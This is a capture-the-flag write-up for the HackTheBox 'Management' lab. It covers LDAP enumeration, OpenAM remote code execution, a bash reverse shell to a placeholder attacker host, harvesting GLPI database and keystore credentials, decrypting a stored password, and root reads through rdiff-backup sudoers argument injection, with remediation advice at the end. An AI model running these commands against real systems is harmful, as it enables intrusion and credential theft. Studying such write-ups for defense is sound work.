# HackTheBox — Management

> **Disclaimer** — Educational writeup of a controlled lab environment (HackTheBox). Flags have been replaced with `<FLAG_USER>` / `<FLAG_ROOT>`. **Do not use these techniques against systems without explicit authorization.**

---

## Overview

**Management** is a Linux machine that chains together several misconfigurations and poorly protected secrets:

1. An **LDAP server allows anonymous bind**, exposing the directory structure.
2. A subdomain points to an **OpenAM 16.0.5** instance, vulnerable to a known authentication/RCE flaw.
3. Exploiting it grants access to the `openam` service account, which has read access to sensitive configuration files.
4. Those files reveal the `keystorepass`, which serves as a clue to investigate other services on the machine — namely a **GLPI** instance (IT asset management software).
5. The GLPI database contains user hashes and a value **encrypted with GLPI's internal key** (`GLPIKey`), stored in the LDAP configuration table (`glpi_authldaps`).
6. By reusing GLPI's own encryption mechanism (via `/opt/glpi/vendor/autoload.php` and the `GLPIKey` class), that value can be decrypted, yielding a valid password.
7. That password grants SSH access to the user `owen`.
8. Finally, a misconfigured `sudoers` rule for `rdiff-backup` allows **argument injection**, making it possible to read any file on the system as root — including the flag.

| Stage | Vector |
|---|---|
| Reconnaissance | LDAP with anonymous bind enabled |
| Initial access | Known exploit in OpenAM 16.0.5 → RCE as `openam` |
| Pivot 1 | OpenAM configuration secrets reveal clues about GLPI |
| Pivot 2 | Decryption of a secret stored in GLPI's DB using GLPI's own `GLPIKey` library |
| Lateral access | SSH as `owen`, using the decrypted password |
| Root privilege | `sudo rdiff-backup` with argument injection via `--restrict-path` |

---

## Reconnaissance

```bash
nmap -Pn -sV <TARGET_IP>
```

**Result:**

```text
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
4444/tcp  open  ssl/ldap
50389/tcp open  ldap     (Anonymous bind OK)
```

---

## Port Analysis

### Port 22 — SSH

Standard remote-access service. Kept in mind for a later stage, once valid credentials are obtained.

### Port 80 — HTTP

```bash
echo '<TARGET_IP> management.htb sso.management.htb' | sudo tee -a /etc/hosts
curl -I http://management.htb
```

**Result:**

```text
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Location: https://<TARGET_IP>/
```

Redirects to HTTPS — the real application runs on port 443.

### Port 4444 — SSL/LDAP

This port is frequently used as the administration port of **Oracle Unified Directory (OUD)** or **ForgeRock Directory Services**, usually over SSL (LDAPS).

### Port 50389 — LDAP (anonymous bind allowed)

Nmap already flagged **"Anonymous bind OK"** — meaning the LDAP server allows anyone to connect and read the directory tree **without providing credentials**. This is investigated in detail in the next section.

---

## Anonymous LDAP Enumeration

```bash
ldapsearch -x -H ldap://<TARGET_IP>:50389 -s base namingcontexts
```

**Result:**

```text
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts

dn:
namingcontexts: dc=management,dc=htb

# search result
search: 2
result: 0 Success
```

This confirms the directory's **base DN** (`dc=management,dc=htb`), which matches the `management.htb` domain already identified via DNS/hosts. This information doesn't directly return credentials, but it helps correlate the application's components (LDAP + domain + web application) found next.

---

## OpenAM — Identification and Exploitation

During a more thorough review of the site, the following subdomain was found:

```text
https://sso.management.htb/openam/XUI/#login/
```

This endpoint points to **OpenAM**, an SSO/Identity Management platform. The identified version was **16.0.5**, for which a known public exploit exists that allows remote command execution through a poorly protected password-reset endpoint (`PWResetUserValidation`).

### Confirming remote command execution

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
```

**Result:**

```text
[+] HTTP 200
uid=996(openam) gid=987(openam) groups=987(openam)
```

**RCE confirmed** — commands passed to the exploit are executed on the server, with the privileges of the `openam` service account.

---

## Reverse Shell as `openam`

With RCE confirmed, the next step is to get a real interactive shell, instead of relying on one-off command execution.

```bash
# listener on the attacking machine
nc -lvnp 4444
```

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

As soon as the connection arrives, upgrade to an interactive TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
whoami
# openam
```

---

## Pivoting to GLPI

With shell access as `openam`, enumerating the configuration directory revealed interesting clues:

```bash
cd /opt/openam/config
ls
# boot.json  config  install.log  ldif  openam  opends  template
```

### Analyzing `boot.json`

```bash
cat boot.json
```

```json
{
  "instance" : "https://sso.management.htb:443/openam",
  "dsameUser" : "cn=dsameuser,ou=DSAME Users,dc=management,dc=htb",
  "keystores" : {
    "default" : {
      "keyStorePasswordFile" : "/opt/openam/config/openam/.storepass",
      "keyPasswordFile" : "/opt/openam/config/openam/.keypass",
      "keyStoreType" : "JCEKS",
      "keyStoreFile" : "/opt/openam/config/openam/keystore.jceks"
    }
  },
  "configStoreList" : [ {
    "baseDN" : "dc=management,dc=htb",
    "dirManagerDN" : "cn=Directory Manager",
    "ldapHost" : "sso.management.htb",
    "ldapPort" : 50389,
    "ldapProtocol" : "ldap"
  } ]
}
```

This file confirms the connection between OpenAM and the already-enumerated LDAP server, and points to files holding the keystore passwords:

```bash
cat /opt/openam/config/openam/.keypass
# changeit

cat /opt/openam/config/openam/.storepass
# S9n50IUgcRe1Lkj/7gp5OpdZHf1bphqh
```

> **Note:** `changeit` is the default password for many Java keystores — a clear sign of a configuration that was never hardened after installation.

### Discovering GLPI

Continuing to enumerate the filesystem, an interesting directory was found outside of OpenAM's context:

```bash
ls -la /opt/glpi/config/
```

```text
total 24
drwxr-xr-x  2 www-data www-data 4096 ... .
drwxr-xr-x 22 www-data www-data 4096 ... ..
-rw-r--r--  1 www-data www-data  273 ... config_db.php
-rw-r--r--  1 www-data www-data   32 ... glpicrypt.key
-rw-rw----  1 www-data www-data 1704 ... oauth.pem
-rw-rw----  1 www-data www-data  451 ... oauth.pub
```

**GLPI** is an open-source IT asset management and helpdesk software — a valuable target, as it typically stores credentials for other integrated systems (LDAP, email, API).

---

## Accessing the GLPI Database

### Reading the database configuration

```bash
cat config_db.php
```

```php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'g**i';
   public $dbpassword = '8*********7';
   public $dbdefault = 'g***db';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

The `glpicrypt.key` file was also found — GLPI's **internal encryption key**, used to protect secrets stored in the database (such as credentials for LDAP servers configured within the application). This file by itself is in binary/encrypted format and isn't directly readable — but it will become essential later on.

### Connecting to the database

```bash
mysql -h 127.0.0.1 -u g**i -p'8**********7' g****b
```

```sql
show tables;
```

The database has hundreds of typical GLPI tables (`glpi_agents`, `glpi_assets_*`, `glpi_tickets`, etc.). Two are of particular interest:

#### `glpi_authldaps`

```sql
select * from glpi_authldaps;
```

In this table, an encrypted value was found:

```text
a******************************************************w==
```

This is most likely the **bind password** of GLPI's LDAP configuration, encrypted with the `glpicrypt.key`.

#### `glpi_users`

```sql
select name, password from glpi_users;
```

```text
 name        | password
-------------+--------------------------------------------------------------
 glpi        | $2y$10$*****************************************************
 post-only   | $2y$10$2.$***************************************************
 tech        | $2y$10$$*****************************************************
 normal      | $2y$10$$*****************************************************
 glpi-system |
```

These are `bcrypt` hashes (identified via [hashes.com](https://hashes.com/en/decrypt/hash) / nth.skerritt.blog as hashcat mode `-m 3200`).

---

## Hash Cracking (unsuccessful) and Pivot to GLPI's Encryption

### Cracking attempt

```bash
hashcat -m 3200 hash.txt ~/wordlists/rockyou.txt
```

Attempting to crack the `bcrypt` hashes with `rockyou.txt` **was unsuccessful** — the passwords weren't in the wordlist.

### Changing strategy: using GLPI's own encryption

Rather than insisting on hash cracking, the best available lead was the encrypted value found in `glpi_authldaps`, combined with the already-identified `glpicrypt.key` file. GLPI has its own PHP class (`GLPIKey`) that implements the encryption/decryption logic used internally by the application — and that class is available on the server itself, via the Composer autoloader.

```bash
which php
php -v
```

With PHP confirmed available on the system, it's possible to write a small script that reuses GLPI's own `GLPIKey` class to decrypt the value found in the database — without needing to reimplement the algorithm manually.

---

## Decrypting the LDAP Credential with `GLPIKey`

```bash
cat > /tmp/decrypt.php << 'PHPEOF'
<?php
define('GLPI_CONFIG_DIR', '/opt/glpi/config/');
define('GLPI_VAR_DIR', '/opt/glpi/files/');

require_once('/opt/glpi/vendor/autoload.php');

$encryptedValue = 'a$*****************************************************==';

$key = new GLPIKey();
$decrypted = $key->decrypt($encryptedValue);

echo "Password: " . $decrypted . "\n";
?>
PHPEOF

php /tmp/decrypt.php
```

**Result:**

```text
Password: ***********
```

> **Why this works:** by defining the `GLPI_CONFIG_DIR` and `GLPI_VAR_DIR` constants and loading the application's own Composer autoloader (`vendor/autoload.php`), the script gets direct access to the `GLPIKey` class, which already knows automatically where to find the `glpicrypt.key` file and how to apply the correct decryption algorithm. It's an elegant way of "asking the application itself" to decrypt the secret, instead of having to reverse-engineer the algorithm (cipher, mode, key derivation) by hand.

---

## SSH Access as `owen`

The decrypted password was tried against the system user `owen` (a name previously seen while enumerating `/home`):

```bash
ssh owen@<TARGET_IP>
# password: WpczC40GhTbk
```

### User flag

```bash
cat ~/user.txt
```

**Result:** `<FLAG_USER>`

---

## Privilege Escalation — `rdiff-backup` Argument Injection

### Enumeration

```bash
id
```

```text
uid=1000(owen) gid=1000(owen) groups=1000(owen)
```

```bash
sudo -l
```

```text
Matching Defaults entries for owen on management:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

### Vulnerability analysis

The asterisk (`*`) at the end of the `sudoers` rule is the core problem: it allows **any extra argument** to be passed to the command, beyond the already-defined fixed arguments. This is a classic form of **argument injection** via `sudoers`.

Two behaviors of `rdiff-backup` make this exploitable:

1. **`--restrict-path` is repeatable** — if passed more than once, `rdiff-backup` uses the **last value provided**. Since the attacker controls what comes after the `*`, a new `--restrict-path` can be injected that overrides the original `/opt/backup`.
2. **`--restrict-mode read-only`** only blocks **write** operations — reading within the allowed path remains free. If the allowed path is overridden to `/` (filesystem root), reading becomes free across the **entire filesystem**.

### Building the exploit

The idea is to use a malicious location in the format `/::/root`, which `rdiff-backup` interprets as:

| Component | Value |
|---|---|
| hostname (remote) | `/` |
| path | `/root` |

The command `sudo` ends up executing on the server, after the argument injection, becomes equivalent to:

```bash
sudo /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup \
  --restrict-mode read-only \
  --restrict-path /
```

The second `--restrict-path /` (ours, injected) overrides the original `/opt/backup` — the `rdiff-backup` server, running as root, can now read the **entire filesystem**.

### Running the exploit

```bash
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root /tmp/root_backup
```

`--remote-schema` defines how the local `rdiff-backup` invokes the remote process — this is where `%s` (automatically substituted with the target's hostname/path) allows our malicious `/::/root` to be injected as the extra argument in the `sudoers` rule.

---

## Root Flag

```bash
cat /tmp/root_backup/root.txt
```

**Result:** `<FLAG_ROOT>`

---

## Lessons Learned

- **Anonymous LDAP bind** exposes the directory structure and makes it easier to reconnoiter internal domains — it should be disabled in production unless explicitly required.
- **Outdated SSO/IAM platforms** (OpenAM 16.0.5, in this case) are high-value targets: compromising the SSO usually grants broad access to other integrated systems.
- **Unchanged default passwords** (`changeit` in Java keystores) are a surprisingly common misconfiguration.
- **Reusing the application's own encryption logic** (instead of trying to brute-force hashes) tends to be the more efficient path when the algorithm and key are accessible on the filesystem.
- **`sudoers` rules with a trailing wildcard (`*`)** are extremely dangerous on tools that accept repeatable flags (`--restrict-path`, in this case) — the last value usually "wins", allowing the intended restriction to be bypassed.

---

## Remediation

| Issue | Fix |
|---|---|
| LDAP with anonymous bind | Disable anonymous bind (`nsslapd-allow-anonymous-access: off` or equivalent); require authentication for any query |
| Outdated OpenAM | Upgrade to a patched version; restrict access to the `PWResetUserValidation` endpoint or disable it if unused |
| Keystore with default password | Never keep `changeit`; generate strong, unique passwords per environment |
| LDAP secret readable in GLPI's DB | Restrict access to the database and to the `glpicrypt.key` file; rotate the key periodically |
| `sudoers` with wildcard in `rdiff-backup` | Never allow free-form arguments (`*`) in `NOPASSWD` commands; explicitly fix every allowed argument, with no user-controllable repeatable flags |

---

## Tools Used

- `nmap` — port and service reconnaissance
- `ldapsearch` — LDAP directory enumeration
- Public exploit for OpenAM 16.0.5 (RCE via `PWResetUserValidation`)
- `mysql` — accessing GLPI's database
- `hashcat` (`-m 3200`, bcrypt) — hash cracking attempt
- PHP + GLPI's own `GLPIKey` class — decrypting internal secrets
- `ssh` — lateral access as `owen`
- `rdiff-backup` — abusing argument injection for escalation to root

---

